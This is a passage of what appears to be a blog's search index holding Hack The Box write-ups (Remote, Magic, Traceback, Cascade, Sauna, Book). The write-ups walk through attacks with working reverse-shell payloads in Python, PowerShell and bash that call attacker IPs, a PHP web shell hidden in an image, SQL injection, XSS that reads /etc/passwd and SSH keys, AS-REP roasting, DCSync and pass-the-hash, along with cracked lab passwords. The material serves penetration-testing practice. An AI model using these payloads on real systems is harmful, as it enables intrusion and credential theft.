permissions: Sudo permissions: User waldo can run following command without root password: (ALL) SETENV: /opt/scripts/admin_tasks. sh Python library Hijacking: linpeas scan reveal interesting script named backup. py -rwxr----- 1 root admins 198 Dec 2 2019 /opt/scripts/backup. pyThis script contain shutil module and we can hijacking this. He offers a number of high-level operations on files and collections of files. In particular, functions are provided which support file copying and removal.  References about this exploit:  https://docs. python. org/2/library/shutil. html https://medium. com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7 https://bic-berkeley. github. io/psych-214-fall-2016/using_pythonpath. html https://rastating. github. io/privilege-escalation-via-python-library-hijacking/We check execution path of shutil. py library:  Payload Injection in malicious library: Creation of malicious library shutil. py in /tmp/privuser45: import socketimport ptyimport oss=socket. socket(socket. AF_INET,socket. SOCK_STREAM)s. connect(( 10. 10. 14. 223 ,1337))os. dup2(s. fileno(),0)os. dup2(s. fileno(),1)os. dup2(s. fileno(),2)pty. spawn( /bin/bash )And we change the PYTHON path execution to launch the malicious library when we execute the script admin_tasks. sh under root privilege:  Obtaining Reverse Shell and Flag root: Trophy:  We must know. We will know.  David Hilbert "
+    }, {
+    "id": 16,
+    "url": "/posts/HTB-15-Pentest-Remote/",
+    "title": "Write-up Remote Machine",
+    "body": "2020/09/25 - Ref°: HTB-15-Machine — Remote is a vulnerable machine through a misconfigured NFS share, a CMS with a vulnerability in its version that allows to get a foothold on the host. Once on the target machine, a privilege escalation is possible through a vulnerability in our version of Teamviewer with exploitation of regedit.  [1] Discovery - Figure out environment: Network Service Scanning: File Transfert Protocol: Anonymous FTP login allowed. Nothing to exploit here. Website and CMS Umbraco: wfuzz tool reveal install and umbraco path behind the URL. install path response status code 302 and redirect on umbraco. This one response status code 200, we can check it directly. $ wfuzz -c -w /usr/share/wordlists/dirb/common. txt --hc 404,403 http://10. 10. 10. 180/FUZZ Or we can get hint from source-page : Umbraco is an open-source content management system (CMS) platform for publishing content on the World Wide Web and intranets. It is written in C# and deployed on Microsoft based infrastructure.  This CMS seem to be exploitable from different vulnerabilities :  Network File System: The /site_backups directory is mountable for everyone. $ showmount -e 10. 10. 10. 180 We can exploit a weakly configured NFS share to gain access to remote host followed by enumeration. References - exploiting nfs share : https://resources. infosecinstitute. com/exploiting-nfs-share/#gref $ mkdir site_backups$ mount -t nfs 10. 10. 10. 180:site_backups site_backups [2] Foothold - Get into the target : Hashed Password from logfiles: We find many others files and folders. With a little ‘grep’ command in the NFS share, we search all string value in reference with “admin” “administrator” “password”. $ grep -r -i  admin|administrator|password  *We find intereting files App_Data/Logs/* and App_Data/Umbraco. sdf We find admin@htb. local and ssmith@htb. local users in logs files: We find hash value password of our users in the header of Umbraco. sdf file: $ head Umbraco. sdf    admin@htb. local : b8be16afba8c314ad33d812f22a04991b90e2aaa{ hashAlgorithm : SHA1 }     smith@htb. local : jxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={ hashAlgorithm : HMACSHA256 }  Decrypting Password: References - Decrypt SHA1 hash : https://md5decrypt. net/Sha1/  Password decrypt : baconandcheese Obtaining Reverse Shell with RCE Execution: References - RCE umbraco :  https://www. exploit-db. com/exploits/46153 https://github. com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet. mdThe script is a PoC, so we need to modify according to our environment. In the payload part add our reverse shell command in powershell: { string cmd =  $client = New-Object System. Net. Sockets. TCPClient(\'10. 10. 14. 67\',4445);\$stream = $client. GetStream();[byte[]]$bytes = 0. . 65535|%{0};\while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0){;\$data = (New-Object -TypeName System. Text. ASCIIEncoding). GetString($bytes,0, $i); \$sendback=(iex $data | Out-String); $sendback2 = $sendback + \'PS \' + (pwd). Path + \'&gt; \'; \$sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2);$stream. Write($sendbyte,0,$sendbyte. Length);\$stream. Flush();};$client. Close() ; System. Diagnostics. Process proc = new System. Diagnostics. Process();\proc. StartInfo. FileName =  powershell. exe ; proc. StartInfo. Arguments = cmd;\proc. StartInfo. UseShellExecute = false; proc. StartInfo. RedirectStandardOutput = true; \proc. Start(); string output = proc. StandardOutput. ReadToEnd(); return output; } \&lt;/msxsl:script&gt;&lt;xsl:template match= / &gt; &lt;xsl:value-of select= csharp_user:xml() /&gt;\&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; '; proc. StartInfo. FileName = “powershell. exe”In the config part:  login = “admin@htb. local” password = “baconandcheese” host = “http://10. 10. 10. 180” We listen 4445 port and get reverse shell under iis service.  Flag user: And we flag the Public user.  [3] Privilege Escalation - Gain higher-level permissions: Teamviewer 7 Exploitation: With the name of the machine we have a big hint to search way to escalate privilege and compromise the host : Remote = TeamViewer TeamViewer stored admin password encrypted with AES-128-CBC with they key of 0602000000a400005253413100040000 and iv of 0100010067244F436E6762F25EA8D704 in the Windows registry. We only need recover the value of the SecurityPasswordAES in regedit to decrypt this with key and iv parameters. References - exploit method :  https://whynotsecurity. com/blog/teamviewer/ https://github. com/n0fate/chainbreaker/issues/10Encrypted Password from Registry: reg query HKLM /f teamviewer /t REG_SZ /sreg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7\ Decrypting Password: We can decrypt this password using with script python : And get administrator password : !R3m0te! Remote Service WinRM login and Flag root: Reference - evil-winrm : https://github. com/Hackplayers/evil-winrm Trophy:  It doesn’t matter how many times you get knocked down. All that matters is you get up one more time than you were knocked down.  Roy T. Bennett "
+    }, {
+    "id": 17,
+    "url": "/posts/HTB-14-Pentest-Magic/",
+    "title": "Write-up Magic Machine",
+    "body": "2020/08/29 - Ref°: HTB-14-Machine — Magic is a medium level linux machine. It defined by sql injection to bypass the authentication of a login page and the exploitation of payload hidden in an image to gain our “foothold”. A lateral movement on the user theseus is possible through a leaked database and the presence in it of a password reused by this user. Privilege elevation is achieved by exploiting the sysinfo binary and environment variables.  [1] Discovery - Figure out environment: Network Service Scanning: Nmap scan reveal 2 services on her usual port :  ssh on port 22 web on port 80$ nmap -A -T5 10. 10. 10. 185 -p- Website: We have portfolio website with possibility to see all pictures.  And the capacity to upload files if we success to login.  The login page is vulnerable to SQL Injection and we can bypass the authentication. How we know that ? Firstly, when we entered fake credential an error appear and present “Wrong Username or Password”.  And when we entered only a single quote in to the “Username” field and submitted the request using the “Login” button, the error not appear. This show us the website interprets this single quote and had potentially vulnerable to SQL Injection.  References - sql injection : https://portswigger. net/support/using-sql-injection-to-bypass-authentication [2] Foothold - Get into the target : Bypassing Authentication with SQL Injection: Now, we used ' or 1=1 -- This causes the application to perform the query: SELECT * FROM users WHERE username = '' OR 1=1-- ' AND password = 'foo'Because the comment sequence (–) causes the remainder of the query to be ignored, this is equivalent to: SELECT * FROM users WHERE username = ' ' OR 1=1 And we got it! We able to upload images and gain foothold from this way.  Obtaining Reverse Shell with Payload Injection: The condition to upload allowed files are only JPG, JPEG and PNG extensions.  We use exiftool to embed the payload into the picture to bypass this condition. $ exiftool -Comment='&lt;?php echo  &lt;pre&gt; ; system($_GET[ cmd ]); _halt_compiler() ?&gt;' minion. jpg$ mv minion. jpg minion. php. jpgWe need to rename our file to *. php. jpg to bypass the restriction. Anyway the file is parsed as a PHP file and our payload is fully functional: Upload the file : Payload execution : Now we can use commands to control it with our web browser and leak for example passwd file.  We know the system user to exploit : theseus But we must obtain reverse shell to perform lateral movement on this user. We use an other PHP payload we can find from : https://www. asafety. fr/reverse-shell-one-liner-cheat-sheet/ and proceed the same way. We listening the correct port and get reverse shell by www-data : We gain finally our foothold. [3] Lateral Movement - Move through environment: Plaintext Password from database: We have website, the first interesting enumeration we can be realize is on folder /var/www/*. Retrieve database information under db. php5 file :  db name : Magic db host : localhost db username : theseus db password : iamkingtheseus I find php file to perform backup database on localhost such as for example : https://github. com/daniloaz/myphp-backup We retrieve the PHP file from Magic machine and execute to backup the database Magic.   We don’t have the rights to retrieve the backup.  To bypass this restriction, rename the backup file sql. gz to jpg file.  Once we grab the file, we rename correctly and open the database.  The database reveal new password Th3s3usW4sK1ng.  Reusing Password: Theseus account reuse the same password.  Flag user: [4] Privilege Escalation - Gain higher-level permissions: Persistence with SSH Authorized Keys: To proceed more easily, I make my ssh connection more persistent.  Setuid, Path Modification and Reverse Shell with Payload Injection: The enumeration reveal interesting binary /bin/sysinfo. The program run under root privilege but he can be launch by anybody from users group. Our account belongs to this group.  This program launch many module like fdisk, cpuinfo or lshw. We using path variable to escalate our privilege by creating a named file of one of these modules with our bash reverse shell. We modify an environment variable in order to make one of the modules run using the following path : /tmp/privuser/ References - path environment : https://www. hackingarticles. in/linux-privilege-escalation-using-path-variable/ We listening on our local machine and execute sysinfo program on Magic machine. Flag root: Magic machine is compromised. Trophy:  Any sufficiently advanced technology is indistinguishable from magic.  Arthur C. Clarke "
+    }, {
+    "id": 18,
+    "url": "/posts/HTB-13-Pentest-Traceback/",
+    "title": "Write-up Traceback Machine",
+    "body": "2020/08/15 - Ref°: HTB-13-Machine — Traceback is a Linux machine that highlights the exploitation of backdoor (from webshell smevk) present behind a website to gained a foothold. This give us a possibility to enum and find a way to execute lateral movement on user sysadmin through lua script and misconfiguration sudo. Scripts in /etc/update-motd. d/* running under root privileges can be write-edited by the user “sysadmin”. This gives the possibility to place payload and grab a “reverse shell” with root privileges.  [1] Discovery - Figure out environment: Network Service Scanning: The nmap scan reveals SSH and Apache to be running on their usual ports; 22 and 80. $ nmap -A -T5 10. 10. 10. 181 -p- Website defaced: We discover deface site on web service. Apparently Xh4H hacker left a backdoor, maybe to exploit it later.  The hacker left us a hint in the source code by adding as a comment in the html code this : Some of the best web shells that you might need ;).  This hint is a reference of the following webshells from github repository : https://github. com/TheBinitGhimire/Web-Shells A webshell is a web security threat, which is a web-based implementation of the shell concept. A webshell is able to be uploaded to a web server to allow remote access to the web server, such as the web server’s file system. A webshell is unique in that it enables users to access a web server by way of a web browser that acts like a command-line interface. [2] Foothold - Get into the target : Finding SmEvK Webshell: After testing them all, we find the webshell concerned : SmEvK_PaThAn Shell V3 on http://10. 10. 10. 181/smevk. php We success to log-in the webshell with credential mentionned in the source code : admin / admin  The exploitation is successful and we have gained a foothold. Lateral Movement - Move through environment: Sudo Misconfiguration: Enum with webadmin account and check the file /etc/passwd to find an other interesting system user : sysadmin User sysadmin may run the following commands with no password under root privilege (ALL) NOPASSWD: /home/sysadmin/luvit We find file under /home/webadmin/note. txt which refers to a tool to practice lua.  Lua is a lightweight, high-level, multi-paradigm programming language designed primarily for embedded use in applications. The tool to practice lua script is Luvit. He is mentionned above on the result of the command sudo -l. SSH Authorized Keys: With present misconfiguration on sudo command for the sysadmin user, we use personnal lua script to send my public ssh key in her folder */. ssh/authorized_keys. Same method in other machine : See Postman Writeup. Reference - lua script : https://www. tutorialspoint. com/lua/lua_file_io. htm After search in the documentation, we can define the script pattern to be used : CODEfile = io. open (filename [, mode])file:write( --test )file:close(). . . . . filename =  /home/sysadmin/. ssh/authorized_keys mode =  a  Append mode that opens an existing file or creates a new file for appending. --test =  pub ssh key value We generate our ssh key pair to put the public key value in our lua script. $ ssh-keygen -t rsa -b 2048 We upload the script from the webshell and execute this under root privilege.  Remote Service SSH login: We have now the possibility to connect on sysadmin through ssh : $ ssh sysadmin@10. 10. 10. 181 -i traceback Flag user: We flag the user to validate the compromission of the system user.  [3] Privilege Escalation - Gain higher-level permissions: Privilege Misconfiguration: We use linpeas script to check every possible path to increase our privilege.  The script reveal interesting group named /etc/update-motd. d where many files are writables with sysadmin privilege.  We can confirm that with ls -la command.  According to linux manual : “UNIX/Linux system adminstrators often communicate important information to console and remote users by maintaining text in the file /etc/motd, which is displayed by the pam_motd(8) module on interactive shell logins. Traditionally, this file is static text, typically installed by the distribution and only updated on release upgrades, or overwritten by the local administrator with pertinent information. Ubuntu introduced the update-motd framework, by which the motd(5) is dynamically assembled from a collection of scripts at login. Executable scripts in /etc/update-motd. d/* are executed by pam_motd(8) as the root user at each login, and this information is concatenated in /var/run/motd. The order of script execution is determined by the run-parts(8) –lsbsysinit option (basically alphabetical order, with a few caveats). ” Reference - Manual Linux Update-motd. d : http://manpages. ubuntu. com/manpages/trusty/man5/update-motd. 5. html Here you can see how this works when you log on to ssh : For this example /etc/update-motd. d/00-header file = Welcome to Xh4H land The use of the pspy tool confirms the execution of these scripts under root privilege (UID 0).  Obtaining Reverse Shell with Payload Injection: We can push custom payload into one of theses script to get reverse shell under root privilege when they are executed. $ msfvenom -p linux/x64/shell_reverse_tcp -f elf -o shell LHOST=10. 10. 14. 54 LPORT=4444After creating our payload, we send it to our target machine and place it in the /tmp/ folder. Now we can call our payload to be executed in one of the scripts in the update-motd. d folder. I choose 00-header.  We prepare our attacking machine to receive the shell with nc command and we launch new ssh connexion.  Flag root: We obtained the shell under root privilege. We have compromise Traceback machine.  Trophy:  Aim for the sky, but move slowly, enjoying every step along the way. It is all those little steps that make the journey complete.  Chanda Kochhar "
+    }, {
+    "id": 19,
+    "url": "/posts/HTB-12-Pentest-Cascade/",
+    "title": "Write-up Cascade Machine",
+    "body": "2020/07/25 - Ref°: HTB-12-Machine — Cascade is a Windows Medium machine which highlights the misconfiguration of the accounts and strength in the use of code review to recover sensitive information.  [1] Discovery - Figure out environment: Network Service Scanning: Nmap scan reveal many services on her usual port such as : kerberos, ldap, smb, etc. $ nmap -Pn -T5 10. 10. 10. 182 -p- Server Message Block: My first reaction is to use enum4linux to hope find many users and the domain to pwned. $ enum4linux 10. 10. 10. 182And we got all of this : Administrator, krbtgt, e. crowe, b. hanson, i. croft, CascGuest, arksvc, s. smith, r. thompson, util, j. wakefield, s. hickson, j. goodhand, a. turnbull, d. burman, BackupSvc, j. allen We can also use rpcclient to find the same thing. $ rpcclient -U    10. 10. 10. 182rpcclient $&gt; enumdomusersuser:[CascGuest] rid:[0x1f5]user:[arksvc] rid:[0x452]user:[s. smith] rid:[0x453]user:[r. thompson] rid:[0x455]user:[util] rid:[0x457]user:[j. wakefield] rid:[0x45c]user:[s. hickson] rid:[0x461]user:[j. goodhand] rid:[0x462]user:[a. turnbull] rid:[0x464]user:[e. crowe] rid:[0x467]user:[b. hanson] rid:[0x468]user:[d. burman] rid:[0x469]user:[BackupSvc] rid:[0x46a]user:[j. allen] rid:[0x46e]user:[i. croft] rid:[0x46f]smb and kerberos services reveal nothing. Lightweight Directory Access Protocol: We use ldapsearch tool to find other information through ldap service. $ ldapsearch -x -h 10. 10. 10. 182 -p 389 -b  dc=cascade,dc=local  &gt; ldapsearch. txt[2] Foothold - Get into the target : Encoded Password from attribute: To perform the enumeration, we grep all information reference by password, passwd, or pwd. Here we find interesting attribute with name cascadeLegacyPwd from the user r. thompson. clk0bjVldmE= he seem to be her hash password encode in base 64? $ grep  Pwd  ldapsearch. txt Decoding Password: No vulnerabilities identify here, but we have possibility to decrypt hash password of the user r. thompson. We can exploit this to access and gain a foothold. We create file which contain the hash password and use this command to decrypt: $ command base64 -d passwd. txt We found the password : rY4n5eva Remote Service SMB login: We can use this credential to access of the target through smb service. $ smbmap -u r. thompson -p rY4n5eva -H 10. 10. 10. 182smbmap tool reveal more available share with this account, but the more interesting is Data share.  [3] Lateral Movement - Move through environment: Encrypted Password from . reg file: Enumeration of Data Share : $ mount -t cifs //10. 10. 10. 182/Data share_data -o username='r. thompson',password=rY4n5evaUnder /IT/Email Archives/, we have Meeting_Notes_June_2018. html.  This email archive reveal about temporary account which used to perform all tasks related to the network migration and this account has been deleted. The username was TempAdmin and the password is the same of the normal admin account. Under /IT/Logs/Ark AD Recycle Bin/, we have ArkAdRecycleBin;Log. This file show us two things :  We have execution of program by ArkSvc TempAdmin account has been moved to AD recycle bin Under /IT/Temp/s. smith/, we have VNC Install. reg. This file contain password in hex format … Decrypting Password: I find tool to decrypt vnc password in hex format. Reference - vncpasswd tool : https://github. com/trinitronx/vncpasswd. py $ python2 vncpasswd. py -d -H 6bcf2a4b6e5aca0fWe found password : sT333ve2 Remote Service WinRM login: We have now the possibility to connect through evil-winrm and grab the flag user. $ evil-winrm -i 10. 10. 10. 182 -u s. smith -p sT333ve2Flag user: [4] Lateral Movement - Move through environment 2: Remote Service SMB login: smbmap tool reveal more available share with this new account, but the more interesting is audit$ share. smbmap -u s. smith -p sT333ve2 -H 10. 10. 10. 182$ mount -t cifs //10. 10. 10. 182/audit$ share_audit -o username='s. smith',password=sT333ve2Under /audit/DB/, we have Audit. db. Under /audit/, we have CascAudit. exe and many . dll files. Encrypted Password from database: We found inside ldap table encrypt password of arksvc account : BQO5l5Kj9MdErXx6Q6AGOw== Review Code CascAudit. exe :: We use ILSpy tool to decompile the program CascAudit. exe and we have the key used for the encryption and decryption of arksvc account password : c4scadek3y654321 But we need to recover the complete function of decryption to discover the password. This function is present in CascCrypto. dll.  What we learn here is that to encrypt a string, we use the following :  Key = c4scadek3y654321 initVector = 1tdyjCbY1Ix49842 keySize = 128So we have the possiblity to decrypt the hash from function DecryptString. 	public static string DecryptString(string EncryptedString, string Key)	{		//Discarded unreachable code: IL_009e		byte[] array = Convert. FromBase64String(EncryptedString);		Aes aes = Aes. Create();		aes. KeySize = 128;		aes. BlockSize = 128;		aes. IV = Encoding. UTF8. GetBytes( 1tdyjCbY1Ix49842 );		aes. Mode = CipherMode. CBC;		aes. Key = Encoding. UTF8. GetBytes(Key);		using (MemoryStream stream = new MemoryStream(array))		{			using (CryptoStream cryptoStream = new CryptoStream(stream, aes. CreateDecryptor(), CryptoStreamMode. Read))			{				byte[] array2 = new byte[checked(array. Length - 1 + 1)];				cryptoStream. Read(array2, 0, array2. Length);				return Encoding. UTF8. GetString(array2);			}		}	}Decrypting Password: We create a new cs project with visual-studio and insert only the functions we need. Utils. cs : using System;using System. IO;using System. Security. Cryptography;using System. Text;public class Crypto{	public const string DefaultIV =  1tdyjCbY1Ix49842 ;	public const int Keysize = 128;	public static string EncryptString(string Plaintext, string Key)	{		byte[] bytes = Encoding. UTF8. GetBytes(Plaintext);		Aes aes = Aes. Create();		aes. BlockSize = 128;		aes. KeySize = 128;		aes. IV = Encoding. UTF8. GetBytes( 1tdyjCbY1Ix49842 );		aes. Key = Encoding. UTF8. GetBytes(Key);		aes. Mode = CipherMode. CBC;		using (MemoryStream memoryStream = new MemoryStream())		{			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes. CreateEncryptor(), CryptoStreamMode. Write))			{				cryptoStream. Write(bytes, 0, bytes. Length);				cryptoStream. FlushFinalBlock();			}			return Convert. ToBase64String(memoryStream. ToArray());		}	}	public static string DecryptString(string EncryptedString, string Key)	{		//Discarded unreachable code: IL_009e		byte[] array = Convert. FromBase64String(EncryptedString);		Aes aes = Aes. Create();		aes. KeySize = 128;		aes. BlockSize = 128;		aes. IV = Encoding. UTF8. GetBytes( 1tdyjCbY1Ix49842 );		aes. Mode = CipherMode. CBC;		aes. Key = Encoding. UTF8. GetBytes(Key);		using (MemoryStream stream = new MemoryStream(array))		{			using (CryptoStream cryptoStream = new CryptoStream(stream, aes. CreateDecryptor(), CryptoStreamMode. Read))			{				byte[] array2 = new byte[checked(array. Length - 1 + 1)];				cryptoStream. Read(array2, 0, array2. Length);				return Encoding. UTF8. GetString(array2);			}		}	}}Program. cs : We pass the hash value like EncryptedString and the key to call the function DecryptString and result in console the plaintext password. ﻿using System;namespace Cascade_Decrypt_Password_arksvc{  class Program  {    static void Main(string[] args)    {      Console. WriteLine(Crypto. DecryptString( BQO5l5Kj9MdErXx6Q6AGOw== ,  c4scadek3y654321 ));    }  }}The password decrypted : w3lc0meFr31nd Remote Service WinRM login: $ evil-winrm -i 10. 10. 10. 182 -u arksvc -p w3lc0meFr31nd[5] Privilege Escalation - Gain higher-level permissions: AdminTemp Exploitation from Recycle-Bin: We identified ArkSvc account was being used to move the TempAdmin account to the recycle bin. TempAdmin for Reminder has the same password as the administrator. Encoded Password from attribute: Let’s take a look at the properties of this account. PS c:\Users\arksvc\Documents&gt; get-addomain | select DeletedObjectsContainerPS c:\Users\arksvc\Documents&gt; Get-ADObject -filter 'isDeleted -eq $true -and name -ne  Deleted Objects ' -includeDeletedObjects -property * We have the same attribute under AdminTemp cascadeLegacyPwd and we grab the hash password in base64 : YmFDVDNyMWFOMDBkbGVz Decoding Password: $ command base64 -d passwd2. txtWe found the password : baCT3r1aN00dles Remote Service WinRM login and Flag root: We get full control of Cascade machine. $ evil-winrm -i 10. 10. 10. 182 -u administrator -p baCT3r1aN00dles Trophy:  Your most unhappy customers are your greatest source of learning.  Bill Gates "
+    }, {
+    "id": 20,
+    "url": "/posts/HTB-11-Pentest-Sauna/",
+    "title": "Write-up Sauna Machine",
+    "body": "2020/07/18 - Ref°: HTB-11-Machine — Sauna is a Windows machine that highlights the enumeration of users through the web and ldap service and the practice of the AS-REP Roasting attack (Kerberos service) with work around usernames format to find our first credential. This allows us to have access on the machine with evil-winrm tool and gain a foothold. Lateral movement on svc_loanmgr is possible through the configuration like Autologon. This brings to light her password in clear in regedit. Privilege escalation is possible from svc_loanmgr. We can perform DCSync attack and find the hash of the administrator. Pass the Hash Attack help us to be authenticated without administrator password.  [1] Discovery - Figure out environment: Check all services: We find interesting services ; dns, kerberos, ldap and smb on their usual ports. $ nmap -A -T5 10. 10. 10. 175 -p- Website IIS: Many username present under about page : Fegus Smith, Shaun Coins, Hugo Bear, Bowie Taylor, Sophie Driver, Steven Kerb Enumerate LDAP service from ldap-search script: Ldap service give us essential informations with nmap script ldap-search on port 389. $ nmap --script ldap-search 10. 10. 10. 175 -p 389 Exploit Active Directory Machine: We have much possitiblity to exploit Active-Directory Machine. Reference - Active-Directory exploit toolbox : https://github. com/infosecn1nja/AD-Attack-Defense/blob/master/README. md Here our target is kerberos service. This service is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner. We have several possible attacks : AS-Rep Roasting / Kerberoasting / Pass the key / Pass the ticket / Silver ticket / Golden ticket We use AS-Rep Roasting attack to gain a foothold. This technique is simple, that allows to retrieve hash (NTLM) from users of a domain that do not require kerberos pre-authentication. The hash can then be cracked via JohnTheRipper for example. By default pre-authentication is enabled but can be disabled in the user properties via the Active Directory. Reference - AS-Rep Roasting attack : https://beta. hackndo. com/kerberos-asrep-roasting/ [2] Foothold - Get into the target : As-Rep Roasting Attack: We create the userfile with all combinations of username format we which can be found in the Active-Directory.  Get hash password of all users who do not require Kerberos preauthentication with GetNPUsers. py Reference - GetNPUsers. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers. py $ python3 GetNPUsers. py egotistical-bank. local/ -usersfile /home/pcw3r/Documents/writeups/htb/sauna/userfile-asrep. txt -format hashcat -outputfile /home/pcw3r/Documents/writeups/htb/sauna/hashuser. txt -dc-ip 10. 10. 10. 175 We result hash NTLM for the user fmsith.  Cracking password: We crack the password of the user fmsith : TheStrokes23 Reference - johntheripper tool : https://bytesoverbombs. io/cracking-everything-with-john-the-ripper-d434f0f6dc1c $ /usr/sbin/john --wordlist=/root/Documents/wordlist/rockyou. txt /home/pcw3r/Documents/writeups/htb/sauna/hashuser. txt Remote Service WinRM login: We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985). WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators. Reference - evil-winrm tool : https://github. com/Hackplayers/evil-winrm Flag user: The exploitation is successful and we have gained a foothold. [3] Lateral Movement - Move through environment: Plaintext Password in Autologon: We use winPEAS tool to search possible local privilege escalation paths. First we need to import this tool through attribute -e in evil-winrm. $ ruby evil-winrm. rb -i 10. 10. 10. 175 -u fsmith -p 'TheStrokes23' -e  /home/pcw3r/Documents/tools/. . . / PS c:\Users\FSmith\Documents&gt; menuPS c:\Users\FSmith\Documents&gt; Invoke-Binary  /home/pcw3r/Documents/tools/. . . /winPEASany. exe  cmd fast winPEAS result AutoLogon credential for svc_loanmgr account : Moneymakestheworldgoround! Remote Service WinRM login: We connect with evil-winrm. $ ruby evil-winrm. rb -i 10. 10. 10. 175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'PS c:\Users\FSmith\Documents&gt; Invoke-Binary  /home/pcw3r/Documents/tools/. . . /winPEASany. exe  cmd fast[4] Privilege Escalation - Gain higher-level permissions: DCSync Attack: We have accounts that can log on to the DC, so it’s possible to dump hashes from NTDS. dit remotely via RPC protocol with secretdump through impacket toolbox. We can also said “we perform a DCSync Attack”. DCSync is an attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password hash of the entire domain via domain replication. References - DCSync Attack :  https://medium. com/@airman604/dumping-active-directory-password-hashes-deb9468d1633 https://attack. stealthbits. com/privilege-escalation-using-mimikatz-dcsyncReference - secretdump. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/secretsdump. py $ python3 secretsdump. py -just-dc-ntlm EGOTISTICAL-BANK. LOCAL/svc_loanmgr@10. 10. 10. 175We retrieve the html hash of administrator to success a connection with wmiexec.  We could have realized with fmsith account, but the password has expired.  Pass The Hash: Always from our impacket toolbox, we use nthash (a part of the administrator hash password lmhash:nthash) and wmiexec script without knowledge of the Administrator password to gain access. Reference - Pass the Hash : https://blog. ropnop. com/practical-usage-of-ntlm-hashes/ Reference - wmiexec. py : https://github. com/SecureAuthCorp/impacket/blob/master/examples/wmiexec. py $ python3 wmiexec. py -hashes :d9485863c1e9e05851aa40cbb4ab9dff administrator@10. 10. 10. 175Flag root: Sauna machine is compromise. Trophy:  Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.  Bill Gates "
+    }, {
+    "id": 21,
+    "url": "/posts/HTB-10-Pentest-Book/",
+    "title": "Write-up Book Machine",
+    "body": "2020/07/10 - Ref°: HTB-10-Machine — Book is a Linux machine that highlights SQL truncation to bypass admin password and the execution of xss attack in PDF to read and recover passwd file and id_rsa of reader user. The private key has no password and allow the connection on ssh to gain foothold. And we can winning a race condition in logrotate to elevate privileges.  [1] Discovery - Figure out environment: Check all services: We find services web and ssh on their usual ports. $ nmap -A -T5 10. 10. 10. 176 -p- Website on port 80: We have the possibility to create account and access like simple user. Here we register :  Username : userdemo Email : userdemo@book. com Password : userdemo  Collections area seem to let us upload file on the server : And Contact Us reveal admin mailbox : admin@bootk. htb Scan website path with Dirb: Dirb scan reveal an other path on the website, named admin : Other paths are forbidden. Source page: The source page reveal interesting script in main page. We have character limit included in the application.  [2] Foothold - Get into the target : Bypassing Authentication with SQL Truncation: We can perform sql truncation on the signup page to bypass admin password. References - sql truncation :  https://blog. lucideus. com/2018/03/sql-truncation-attack-2018-lucideus. htmlWe enable Burpsuite to intercept signup request with values :  Username : admin –&gt; True value in target database Email : admin@book. htb –&gt; True value in target database Password : admindemo –&gt; New password value We intercept the request, and add 6 space input after email to result 20 characters. All values afterwards are not taken into consideration.  We add false email adminexploit@book. com.  And we bypass admin account with our password on http://10. 10. 10. 176/admin.  Email : admin@book. htb –&gt; True value in target database Password : admindemo –&gt; New password value We can export PDF to list all users who are access on the user panel and all collections uploaded from users.  All PDF seem to be automatically generated.  [3] Lateral Movement - Move through environment: Cross Site Scripting: In this case, we can read local file on the target via XSS in Dynamically Generated PDF. References - xss attack :  https://owasp. org/www-community/vulnerabilities/Unrestricted_File_Upload https://www. noob. ninja/2017/11/local-file-read-via-xss-in-dynamically. html https://book. hacktricks. xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-fileFrom user panel, we test if javascript is executed on the “Author” field when we upload it with any pdf. &lt;images src=x onerror=document. write('aaaa')&gt; The submission work correctly.  From admin panel in collections area, we export Collections PDF to generated new PDF.  Javascript is executed when inject into Author field and return the value in new PDF.  We try the same method to read /etc/passwd &lt;script&gt;x=new XMLHttpRequest;x. onload=function(){document. write(this. responseText)};x. open( GET , file:///etc/passwd );x. send();&lt;/script&gt; We result the target to gain a foothold : reader Now, we try to get her id_rsa file from home/reader/. ssh/ &lt;script&gt;x=new XMLHttpRequest;x. onload=function(){document. write(this. responseText)};x. open( GET , file:///home/reader/. ssh/id_rsa );x. send();&lt;/script&gt;Works ! We recover this to attempt cracking password and connect on ssh.  For some reason, the copy-past of the id_rsa from Firefox into new file dont work correctly … The issue is resolve when we do this with Chrome.  Remote Service SSH login: Okay, we need to rebuild the right on the private key to use it correctly.  $ chmod +x id_rsa_chrome$ ssh reader@10. 10. 10. 176 -i id_rsa_chrome [4] Privilege Escalation - Gain higher-level permissions: Race condition on Logrotate: The home reader contain 1 folder named backups and 1 script lse. sh. The folder backup contain 2 log files only.  linPEAS scan reveal some privilege-escalation method : But the logrotate exploitation is more interesting (reference about log files presents in home reader).  pspy tool confirm this trough the execution of logrotate tool under root privilege.  We can winning a race condition in logrotate to elevate privileges. References - logrotate exploitation :  https://github. com/whotwagner/logrotten https://medium. com/@ashishrohra/race-condition-exaplained-for-dummies-10c54a265192 https://tech. feedyourhead. at/content/details-of-a-logrotate-race-condition https://www. asafety. fr/reverse-shell-one-liner-cheat-sheet/1 - Requirement:  Logrotate has to be executed as root –&gt; Yes, pspy verify this.  The logpath needs to be in control of the attacker –&gt; Yes, linpeas verify this Any option that creates files is set in the logrotate configuration –&gt; Yes2 - Compile logrotten: From target machine : reader@book:/tmp$ gcc -o logrotten logrotten. c3 - Prepare payload: reader@book:/tmp$ nano payloadbash -i &gt;&amp; /dev/tcp/10. 10. 14. 223/1234 0&gt;&amp;14 - Listen and wait root shell redirection: From attacking machine : $ nc -lvp 12345 - Exploit: To trigger the rotation of the log, we write before in access. log. reader@book:/tmp$ echo exploit /home/reader/backups/access. log &amp;&amp; . /logrotten -d -p . /payload /home/reader/backups/access. 